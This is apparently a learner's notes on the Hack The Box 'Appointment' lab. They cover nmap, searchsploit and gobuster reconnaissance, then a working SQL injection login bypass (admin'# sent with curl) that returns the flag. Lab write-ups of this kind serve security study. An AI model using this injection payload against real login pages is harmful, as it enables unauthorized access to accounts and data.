## Lab Title: Appointment
- Date: 2025-08-04
- Duration: ~30 minutes

### Platform: HTB – Starting Point > Tier 1

### 1. Scenario Summary
- Learn SQL Injectoin >> `nmap` >> craft a SQL payload

### 2. Findings
- SQL                >> Structured Query Language
- SQL Injection      >> SQL attack type
- A03:2021-Injection >> Top 10 OWASP

- nmap               >> Enumeration
    - `nmap $ip -sV -p T:80`
    - Apache httpd 2.4.38 ((Debian))

    - `searchsploit Apacher 2.4.38` >> to check any public exploits for this version of Apache with tool >> searchsploit

- `#`                  >> MySQL >> comment out the rest part

- Gobuster:
    - `gobuster dir -u http://$ip/ -w /seclists_path/ -x txt,php -o scan_output`
    - `-x txt,php` >> file extensions to look for

- SQL Craft:
    - `admin'#`
        - Here the apostrophe `'` used to cut off the rest of the query in the main SQL query in database
        - `#` here used to comment out the `password` field which is together with `username` field from login page
        - Altogether, the password which we give is not considered since it's commented out by `# `
        - Later in main SQL query >> after `user` part >> the rest of the query will be commented out by apostrophe `'`
        - Ultimate Goal >> to know which `username` is valid & exist in SQL database.

    - `curl -X POST -d "username=admin'#&password=hello" http://$ip:80`
        - Voila, La magique a arrive >> ca y est, c'est fini! J'ai obtenu le drapeau!
            - `<div><h3>Congratulations!</h3><br><h4>Your flag is: ***0796d002*******6f42e****`

### 3. Idea
- Firstly >> I did reconnaisance with Nmap >> found that `80` port is open >> then which server
    is running on it >> got a version of `Apache Server 2.4.38` >> used `searchsploit` to find the
    available expoits for this version of Apache >> no public ones >> then  >> used `gobuster` to do
    dir busting to find any dirs on web server >> not much stuff >> then time to do `SQL injection`
    crafted the payload `admin'#` and through this goal was to find the available & valid username
    and it worked out!
